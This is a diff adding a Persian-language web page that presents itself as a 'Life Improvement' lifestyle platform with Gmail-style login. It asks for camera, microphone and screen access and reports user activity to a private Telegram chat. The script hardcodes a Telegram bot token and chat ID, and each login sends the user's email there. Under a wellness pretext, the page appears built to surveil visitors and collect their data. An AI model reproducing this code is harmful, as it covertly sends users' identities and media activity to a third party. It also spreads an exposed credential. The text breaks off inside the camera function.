@@ -1,0 +1,1810 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Life Improvement - پلتفرم بهبود سبک زندگی</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #4CAF50;
+            --secondary-color: #2196F3;
+            --accent-color: #FF9800;
+            --light-color: #f5f5f5;
+            --dark-color: #333;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --gmail-color: #DB4437;
+            --danger-color: #f44336;
+            --success-color: #4CAF50;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f9f9f9;
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        
+        /* هدر */
+        header {
+            background-color: white;
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo i {
+            margin-left: 10px;
+        }
+        
+        .nav-links {
+            display: flex;
+            list-style: none;
+        }
+        
+        .nav-links li {
+            margin-left: 20px;
+        }
+        
+        .nav-links a {
+            text-decoration: none;
+            color: var(--dark-color);
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        
+        .nav-links a:hover {
+            color: var(--primary-color);
+        }
+        
+        .auth-buttons button {
+            padding: 8px 16px;
+            margin-left: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+        
+        .gmail-btn {
+            background-color: var(--gmail-color);
+            color: white;
+            display: flex;
+            align-items: center;
+        }
+        
+        .gmail-btn i {
+            margin-left: 8px;
+        }
+        
+        .auth-buttons button:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        /* صفحه اصلی */
+        #mainPage {
+            transition: opacity 0.5s;
+        }
+        
+        /* بخش هیرو */
+        .hero {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 80px 0;
+            text-align: center;
+        }
+        
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+        }
+        
+        .cta-button {
+            display: inline-block;
+            background-color: white;
+            color: var(--primary-color);
+            padding: 12px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1rem;
+            transition: all 0.3s;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+        
+        /* بخش ویژگی‌ها */
+        .features {
+            padding: 80px 0;
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 50px;
+            font-size: 2rem;
+            color: var(--dark-color);
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        
+        .feature-card {
+            background-color: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: var(--shadow);
+            transition: transform 0.3s;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .feature-icon {
+            font-size: 40px;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+        
+        .feature-card h3 {
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+        }
+        
+        /* بخش ثبت‌نام */
+        .gmail-auth {
+            padding: 80px 0;
+            background-color: var(--light-color);
+        }
+        
+        .auth-container {
+            display: flex;
+            align-items: center;
+            gap: 50px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .auth-content {
+            flex: 1;
+        }
+        
+        .auth-image {
+            flex: 1;
+            text-align: center;
+        }
+        
+        .auth-steps {
+            margin: 30px 0;
+        }
+        
+        .auth-step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+        }
+        
+        .step-number {
+            background-color: var(--gmail-color);
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 15px;
+            font-weight: bold;
+        }
+        
+        .gmail-form {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .gmail-login-btn {
+            background-color: var(--gmail-color);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: 500;
+            width: 100%;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .gmail-login-btn i {
+            margin-left: 10px;
+            font-size: 1.2rem;
+        }
+        
+        .gmail-login-btn:hover {
+            background-color: #c23321;
+        }
+        
+        /* صفحه داشبورد */
+        .dashboard {
+            display: none;
+            padding: 20px 0;
+        }
+        
+        .dashboard-header {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .user-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background-color: var(--primary-color);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-left: 15px;
+        }
+        
+        .media-controls {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .control-btn {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            transition: all 0.3s;
+        }
+        
+        .control-btn i {
+            margin-left: 5px;
+        }
+        
+        .control-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .camera-btn {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .mic-btn {
+            background-color: #9c27b0;
+            color: white;
+        }
+        
+        .screen-btn {
+            background-color: #ff9800;
+            color: white;
+        }
+        
+        .stop-btn {
+            background-color: var(--danger-color);
+            color: white;
+        }
+        
+        .media-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .video-panel {
+            background-color: #333;
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            min-height: 250px;
+        }
+        
+        .video-panel video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .video-overlay {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+        }
+        
+        .status-indicator {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .status-active {
+            background-color: var(--success-color);
+            box-shadow: 0 0 10px var(--success-color);
+        }
+        
+        .status-inactive {
+            background-color: #ccc;
+        }
+        
+        /* بخش مدیریت Life */
+        .life-management {
+            padding: 40px 0;
+            background-color: var(--light-color);
+            border-radius: 8px;
+            margin-top: 30px;
+        }
+        
+        .management-container {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .management-sidebar {
+            flex: 1;
+            min-width: 300px;
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: var(--shadow);
+        }
+        
+        .management-content {
+            flex: 2;
+            min-width: 300px;
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: var(--shadow);
+        }
+        
+        .life-list {
+            list-style: none;
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .life-list li {
+            padding: 10px 15px;
+            margin-bottom: 10px;
+            background-color: #f5f5f5;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .life-list li:hover {
+            background-color: #e0e0e0;
+        }
+        
+        .life-list li.active {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .action-btn {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+        
+        .create-btn {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .join-btn {
+            background-color: var(--secondary-color);
+            color: white;
+        }
+        
+        .report-btn {
+            background-color: #0088cc;
+            color: white;
+        }
+        
+        .members-list {
+            margin-top: 20px;
+        }
+        
+        .member-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            margin-bottom: 10px;
+            background-color: #f5f5f5;
+            border-radius: 4px;
+        }
+        
+        .member-actions button {
+            padding: 5px 10px;
+            margin-left: 5px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        
+        .remove-btn {
+            background-color: #f44336;
+            color: white;
+        }
+        
+        .promote-btn {
+            background-color: #ff9800;
+            color: white;
+        }
+        
+        .admin-badge {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 0.7rem;
+            margin-right: 10px;
+        }
+        
+        .lock-badge {
+            background-color: #ff9800;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 0.7rem;
+            margin-right: 10px;
+        }
+        
+        /* لینک Life */
+        .life-link-container {
+            background-color: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            margin-top: 20px;
+        }
+        
+        .life-link {
+            display: flex;
+            margin-top: 10px;
+        }
+        
+        .life-link input {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px 0 0 4px;
+            font-family: monospace;
+        }
+        
+        .copy-btn {
+            background-color: var(--secondary-color);
+            color: white;
+            border: none;
+            padding: 0 15px;
+            border-radius: 0 4px 4px 0;
+            cursor: pointer;
+        }
+        
+        /* مودال */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: var(--shadow);
+        }
+        
+        .modal-icon {
+            font-size: 50px;
+            color: var(--gmail-color);
+            margin-bottom: 20px;
+        }
+        
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            justify-content: center;
+        }
+        
+        .modal-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        
+        .modal-close {
+            background-color: #f44336;
+            color: white;
+        }
+        
+        .modal-confirm {
+            background-color: var(--gmail-color);
+            color: white;
+        }
+        
+        /* اعلان */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            border-radius: 4px;
+            color: white;
+            z-index: 1100;
+            display: flex;
+            align-items: center;
+            box-shadow: var(--shadow);
+            transform: translateX(150%);
+            transition: transform 0.3s;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.success {
+            background-color: var(--success-color);
+        }
+        
+        .notification.error {
+            background-color: var(--danger-color);
+        }
+        
+        .notification.info {
+            background-color: var(--secondary-color);
+        }
+        
+        .notification i {
+            margin-left: 10px;
+        }
+        
+        /* رسپانسیو */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            
+            .auth-container {
+                flex-direction: column;
+            }
+            
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            .modal-buttons {
+                flex-direction: column;
+            }
+            
+            .management-container {
+                flex-direction: column;
+            }
+            
+            .dashboard-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .media-controls {
+                justify-content: center;
+            }
+            
+            .media-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .notification {
+                right: 10px;
+                left: 10px;
+                transform: translateY(-100px);
+            }
+            
+            .notification.show {
+                transform: translateY(0);
+            }
+        }
+        
+        /* اسپینر */
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: var(--primary-color);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- هدر و ناوبری -->
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">
+                    <i class="fas fa-heartbeat"></i>
+                    Life Improvement
+                </div>
+                <ul class="nav-links">
+                    <li><a href="#home">خانه</a></li>
+                    <li><a href="#features">ویژگی‌ها</a></li>
+                    <li><a href="#life">بهبود زندگی</a></li>
+                    <li><a href="#management">مدیریت Life</a></li>
+                </ul>
+                <div class="auth-buttons">
+                    <button class="gmail-btn" id="gmailSignup">
+                        <i class="fab fa-google"></i> ورود با Gmail
+                    </button>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- صفحه اصلی (قبل از ورود) -->
+    <div id="mainPage">
+        <!-- بخش هیرو -->
+        <section class="hero" id="home">
+            <div class="container">
+                <h1>سفر خود را به سوی زندگی بهتر آغاز کنید</h1>
+                <p>پلتفرم ما به شما کمک می‌کند تا عادات سالم ایجاد کنید، اهداف خود را تعیین کرده و زندگی متعادل‌تری داشته باشید.</p>
+                <a href="#gmail-auth" class="cta-button">همین حالا شروع کنید</a>
+            </div>
+        </section>
+
+        <!-- بخش ویژگی‌ها -->
+        <section class="features" id="features">
+            <div class="container">
+                <h2 class="section-title">ویژگی‌های پلتفرم</h2>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">🎯</div>
+                        <h3>هدف‌گذاری هوشمند</h3>
+                        <p>اهداف خود را به صورت مرحله‌ای تعیین کرده و پیشرفت خود را پیگیری کنید.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📊</div>
+                        <h3>پیگیری عادات</h3>
+                        <p>عادت‌های روزانه خود را ثبت کرده و نمودار پیشرفت خود را مشاهده کنید.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📚</div>
+                        <h3>منابع آموزشی</h3>
+                        <p>به مجموعه‌ای از مقالات، ویدئوها و دوره‌های آموزشی دسترسی داشته باشید.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">👥</div>
+                        <h3>جامعه حمایتی</h3>
+                        <p>با افراد هم‌فکر ارتباط برقرار کرده و از تجربیات آن‌ها بهره‌مند شوید.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- بخش ثبت‌نام با Gmail -->
+        <section class="gmail-auth" id="gmail-auth">
+            <div class="container">
+                <h2 class="section-title">ثبت‌نام با حساب Gmail</h2>
+                <div class="auth-container">
+                    <div class="auth-content">
+                        <h3>سیستم بهبود زندگی با کنترل کامل رسانه</h3>
+                        <p>پس از ورود، دسترسی کامل به دوربین، میکروفون و اسپیکر برای تجربه‌ای غنی از Life Improvement فعال خواهد شد.</p>
+                        
+                        <div class="auth-steps">
+                            <div class="auth-step">
+                                <div class="step-number">1</div>
+                                <p>ورود امن با حساب Gmail</p>
+                            </div>
+                            <div class="auth-step">
+                                <div class="step-number">2</div>
+                                <p>اعطای دسترسی به دوربین و میکروفون</p>
+                            </div>
+                            <div class="auth-step">
+                                <div class="step-number">3</div>
+                                <p>کنترل کامل رسانه در داشبورد</p>
+                            </div>
+                            <div class="auth-step">
+                                <div class="step-number">4</div>
+                                <p>گزارش خودکار به تلگرام از فعالیت‌ها</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="auth-image">
+                        <div class="gmail-form">
+                            <h3>ورود / ثبت‌نام با Gmail</h3>
+                            <p>برای استفاده از تمامی امکانات پلتفرم، لطفاً با حساب Gmail خود وارد شوید.</p>
+                            
+                            <button class="gmail-login-btn" id="gmailLogin">
+                                <i class="fab fa-google"></i> ادامه با Gmail
+                            </button>
+                            
+                            <div class="form-group">
+                                <label for="email">آدرس ایمیل (برای تست)</label>
+                                <input type="email" id="email" placeholder="example@gmail.com">
+                            </div>
+                            <button class="submit-btn" id="manualLogin">ورود با ایمیل</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- صفحه داشبورد (پس از ورود) -->
+    <div class="dashboard container" id="dashboardPage">
+        <div class="dashboard-header">
+            <div class="user-info">
+                <div class="user-avatar" id="userAvatar">
+                    <i class="fas fa-user"></i>
+                </div>
+                <div>
+                    <h3 id="userName">کاربر مهمان</h3>
+                    <p id="userEmail">user@example.com</p>
+                </div>
+            </div>
+            <div class="media-controls">
+                <button class="control-btn camera-btn" id="startCamera">
+                    <i class="fas fa-video"></i> شروع دوربین
+                </button>
+                <button class="control-btn stop-btn" id="stopCamera" disabled>
+                    <i class="fas fa-video-slash"></i> توقف دوربین
+                </button>
+                <button class="control-btn mic-btn" id="startMic">
+                    <i class="fas fa-microphone"></i> شروع میکروفون
+                </button>
+                <button class="control-btn stop-btn" id="stopMic" disabled>
+                    <i class="fas fa-microphone-slash"></i> توقف میکروفون
+                </button>
+                <button class="control-btn screen-btn" id="startScreen">
+                    <i class="fas fa-desktop"></i> اشتراک‌گذاری صفحه
+                </button>
+                <button class="control-btn stop-btn" id="stopScreen" disabled>
+                    <i class="fas fa-stop-circle"></i> توقف اشتراک
+                </button>
+            </div>
+        </div>
+
+        <div class="media-container">
+            <div class="video-panel">
+                <video id="localVideo" autoplay muted></video>
+                <div class="video-overlay">دوربین شما</div>
+                <div class="status-indicator status-inactive" id="cameraStatus"></div>
+            </div>
+            <div class="video-panel">
+                <video id="screenShare" autoplay></video>
+                <div class="video-overlay">اشتراک‌گذاری صفحه</div>
+                <div class="status-indicator status-inactive" id="screenStatus"></div>
+            </div>
+        </div>
+
+        <!-- بخش مدیریت Life -->
+        <section class="life-management" id="management">
+            <div class="container">
+                <h2 class="section-title">مدیریت Life Improvement</h2>
+                <div class="management-container">
+                    <div class="management-sidebar">
+                        <h3>Lifeهای شما</h3>
+                        <div class="action-buttons">
+                            <button class="action-btn create-btn" id="createLifeBtn">ایجاد Life جدید</button>
+                            <button class="action-btn join-btn" id="joinLifeBtn">پیوستن به Life</button>
+                            <button class="action-btn report-btn" id="telegramReportBtn">ارسال گزارش به تلگرام</button>
+                        </div>
+                        <ul class="life-list" id="lifeList">
+                            <li>در حال بارگذاری...</li>
+                        </ul>
+                    </div>
+                    <div class="management-content">
+                        <h3 id="selectedLifeTitle">یک Life را انتخاب کنید</h3>
+                        <div id="lifeDetails">
+                            <p>برای مشاهده جزئیات و مدیریت اعضا، یک Life از لیست سمت راست انتخاب کنید.</p>
+                        </div>
+                        
+                        <!-- لینک Life -->
+                        <div class="life-link-container" id="lifeLinkContainer" style="display: none;">
+                            <h4>لینک دعوت به Life</h4>
+                            <p>این لینک را با دیگران به اشتراک بگذارید تا بتوانند به Life شما بپیوندند:</p>
+                            <div class="life-link">
+                                <input type="text" id="lifeLinkInput" readonly>
+                                <button class="copy-btn" id="copyLifeLink">کپی</button>
+                            </div>
+                        </div>
+                        
+                        <div class="members-list" id="membersList" style="display: none;">
+                            <h4>اعضای Life</h4>
+                            <div id="membersContainer">
+                                <!-- لیست اعضا اینجا نمایش داده می‌شود -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- مودال‌ها -->
+    <div class="modal" id="confirmationModal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <i class="fab fa-google"></i>
+            </div>
+            <h3>لینک ورود ارسال شد!</h3>
+            <p>لینک ورود به پلتفرم بهبود زندگی به ایمیل Gmail شما ارسال شد. لطفاً صندوق ورودی خود را بررسی کنید.</p>
+            <div class="modal-buttons">
+                <button class="modal-btn modal-close" id="closeModal">بستن</button>
+                <button class="modal-btn modal-confirm" id="openGmail">باز کردن Gmail</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="createLifeModal">
+        <div class="modal-content">
+            <h3>ایجاد Life جدید</h3>
+            <div class="form-group">
+                <label for="lifeName">نام Life</label>
+                <input type="text" id="lifeName" placeholder="نام Life خود را وارد کنید">
+            </div>
+            <div class="form-group">
+                <label for="lifeDescription">توضیحات</label>
+                <input type="text" id="lifeDescription" placeholder="توضیح مختصری درباره Life خود بنویسید">
+            </div>
+            <div class="modal-buttons">
+                <button class="modal-btn modal-close" id="cancelCreateLife">لغو</button>
+                <button class="modal-btn modal-confirm" id="confirmCreateLife">ایجاد Life</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="joinLifeModal">
+        <div class="modal-content">
+            <h3>پیوستن به Life</h3>
+            <div class="form-group">
+                <label for="lifeCode">کد Life</label>
+                <input type="text" id="lifeCode" placeholder="کد Life را وارد کنید">
+            </div>
+            <div class="modal-buttons">
+                <button class="modal-btn modal-close" id="cancelJoinLife">لغو</button>
+                <button class="modal-btn modal-confirm" id="confirmJoinLife">پیوستن</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- اعلان -->
+    <div class="notification" id="notification">
+        <i class="fas fa-bell"></i>
+        <span id="notificationText">این یک اعلان است</span>
+    </div>
+
+    <script>
+        // آدرس سرور واقعی (شبیه‌سازی شده)
+        const SERVER_URL = 'https://jsonplaceholder.typicode.com'; // برای تست - در عمل باید آدرس سرور واقعی باشد
+        
+        // اطلاعات تلگرام
+        const TELEGRAM_BOT_TOKEN = "7523523434:AAHKJAKORgTFREIPFZCpojokEVwFDXwaxko";
+        const TELEGRAM_CHAT_ID = "6071335955";
+        const ADMIN_EMAIL = "csilent030@gmail.com";
+
+        // وضعیت برنامه
+        let currentUser = null;
+        let userLives = [];
+        let localStream = null;
+        let screenStream = null;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // اسکرول نرم برای لینک‌های داخلی
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href');
+                    if(targetId === '#') return;
+                    
+                    const targetElement = document.querySelector(targetId);
+                    if(targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - 80,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+            
+            // مدیریت ثبت‌نام با Gmail
+            const gmailSignupBtn = document.getElementById('gmailSignup');
+            const gmailLoginBtn = document.getElementById('gmailLogin');
+            const manualLoginBtn = document.getElementById('manualLogin');
+            const confirmationModal = document.getElementById('confirmationModal');
+            const closeModal = document.getElementById('closeModal');
+            const openGmail = document.getElementById('openGmail');
+            const telegramReportBtn = document.getElementById('telegramReportBtn');
+            
+            // کنترل‌های رسانه
+            const startCameraBtn = document.getElementById('startCamera');
+            const stopCameraBtn = document.getElementById('stopCamera');
+            const startMicBtn = document.getElementById('startMic');
+            const stopMicBtn = document.getElementById('stopMic');
+            const startScreenBtn = document.getElementById('startScreen');
+            const stopScreenBtn = document.getElementById('stopScreen');
+            const localVideo = document.getElementById('localVideo');
+            const screenShare = document.getElementById('screenShare');
+            const cameraStatus = document.getElementById('cameraStatus');
+            const screenStatus = document.getElementById('screenStatus');
+            
+            // مدیریت Lifeها
+            const createLifeBtn = document.getElementById('createLifeBtn');
+            const joinLifeBtn = document.getElementById('joinLifeBtn');
+            const lifeList = document.getElementById('lifeList');
+            const selectedLifeTitle = document.getElementById('selectedLifeTitle');
+            const lifeDetails = document.getElementById('lifeDetails');
+            const membersList = document.getElementById('membersList');
+            const membersContainer = document.getElementById('membersContainer');
+            const lifeLinkContainer = document.getElementById('lifeLinkContainer');
+            const lifeLinkInput = document.getElementById('lifeLinkInput');
+            const copyLifeLinkBtn = document.getElementById('copyLifeLink');
+            
+            const createLifeModal = document.getElementById('createLifeModal');
+            const joinLifeModal = document.getElementById('joinLifeModal');
+            const cancelCreateLife = document.getElementById('cancelCreateLife');
+            const confirmCreateLife = document.getElementById('confirmCreateLife');
+            const cancelJoinLife = document.getElementById('cancelJoinLife');
+            const confirmJoinLife = document.getElementById('confirmJoinLife');
+            
+            // اعلان
+            const notification = document.getElementById('notification');
+            const notificationText = document.getElementById('notificationText');
+            
+            // کلیک روی دکمه ثبت‌نام با Gmail در هدر
+            gmailSignupBtn.addEventListener('click', function() {
+                window.scrollTo({
+                    top: document.getElementById('gmail-auth').offsetTop - 80,
+                    behavior: 'smooth'
+                });
+            });
+            
+            // کلیک روی دکمه Gmail در فرم
+            gmailLoginBtn.addEventListener('click', function() {
+                simulateGmailAuth();
+            });
+            
+            // ورود با ایمیل دستی
+            manualLoginBtn.addEventListener('click', function() {
+                const email = document.getElementById('email').value;
+                if (!email) {
+                    showNotification('لطفاً ایمیل خود را وارد کنید', 'error');
+                    return;
+                }
+                simulateEmailAuth(email);
+            });
+            
+            // بستن مودال
+            closeModal.addEventListener('click', function() {
+                confirmationModal.style.display = 'none';
+            });
+            
+            // باز کردن Gmail
+            openGmail.addEventListener('click', function() {
+                window.open('https://mail.google.com', '_blank');
+                confirmationModal.style.display = 'none';
+            });
+            
+            // ارسال گزارش به تلگرام
+            telegramReportBtn.addEventListener('click', function() {
+                sendTelegramReport();
+            });
+            
+            // کنترل دوربین
+            startCameraBtn.addEventListener('click', function() {
+                startCamera();
+            });
+            
+            stopCameraBtn.addEventListener('click', function() {
+                stopCamera();
+            });
+            
+            // کنترل میکروفون
+            startMicBtn.addEventListener('click', function() {
+                startMicrophone();
+            });
+            
+            stopMicBtn.addEventListener('click', function() {
+                stopMicrophone();
+            });
+            
+            // کنترل اشتراک‌گذاری صفحه
+            startScreenBtn.addEventListener('click', function() {
+                startScreenShare();
+            });
+            
+            stopScreenBtn.addEventListener('click', function() {
+                stopScreenShare();
+            });
+            
+            // نمایش اعلان
+            function showNotification(message, type = 'info') {
+                notificationText.textContent = message;
+                notification.className = `notification ${type}`;
+                notification.classList.add('show');
+                
+                setTimeout(function() {
+                    notification.classList.remove('show');
+                }, 3000);
+            }
+            
+            // شبیه‌سازی احراز هویت Gmail
+            async function simulateGmailAuth() {
+                try {
+                    showNotification('در حال ورود...', 'info');
+                    
+                    // شبیه‌سازی درخواست به سرور
+                    const response = await fetch(`${SERVER_URL}/users/1`); // استفاده از API تست
+                    const userData = await response.json();
+                    
+                    // ایجاد یک کاربر جدید بر اساس پاسخ سرور
+                    currentUser = {
+                        id: userData.id,
+                        name: userData.name,
+                        email: userData.email,
+                        isLoggedIn: true,
+                        isAdmin: userData.email === ADMIN_EMAIL
+                    };
+                    
+                    // ذخیره اطلاعات کاربر در localStorage
+                    localStorage.setItem('currentUser', JSON.stringify(currentUser));
+                    
+                    // به روز رسانی رابط کاربری
+                    updateUIAfterLogin();
+                    
+                    // گزارش به تلگرام
+                    sendTelegramReport(`🟢 کاربر ${currentUser.email} وارد سیستم شد.`);
+                    
+                    showNotification('با موفقیت وارد شدید!', 'success');
+                    
+                } catch (error) {
+                    console.error('خطا در ورود:', error);
+                    showNotification('خطا در ورود به سیستم', 'error');
+                }
+            }
+            
+            // شبیه‌سازی احراز هویت با ایمیل
+            async function simulateEmailAuth(email) {
+                try {
+                    showNotification('در حال ورود...', 'info');
+                    
+                    // شبیه‌سازی درخواست به سرور
+                    const response = await fetch(`${SERVER_URL}/users/1`); // استفاده از API تست
+                    const userData = await response.json();
+                    
+                    // ایجاد یک کاربر جدید
+                    currentUser = {
+                        id: userData.id,
+                        name: userData.name.split(' ')[0] + ' (کاربر تست)',
+                        email: email,
+                        isLoggedIn: true,
+                        isAdmin: email === ADMIN_EMAIL
+                    };
+                    
+                    // ذخیره اطلاعات کاربر در localStorage
+                    localStorage.setItem('currentUser', JSON.stringify(currentUser));
+                    
+                    // به روز رسانی رابط کاربری
+                    updateUIAfterLogin();
+                    
+                    // گزارش به تلگرام
+                    sendTelegramReport(`🟢 کاربر ${currentUser.email} وارد سیستم شد.`);
+                    
+                    showNotification('با موفقیت وارد شدید!', 'success');
+                    
+                } catch (error) {
+                    console.error('خطا در ورود:', error);
+                    showNotification('خطا در ورود به سیستم', 'error');
+                }
+            }
+            
+            // شروع دوربین
+            async function startCamera() {
+                try {
+                    localStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: false 
+                    });
+                    localVideo.srcObject = localStream;
+                    
+                    startCameraBtn.disabled = true;
+                    stopCameraBtn.disabled = false;
+                    cameraStatus.className = 'status-indicator status-active';
+                    
+                    console.log('دوربین فعال شد');
+                    showNotification('دوربین فعال شد', 'success');
+                    
+                    // گزارش به تلگرام
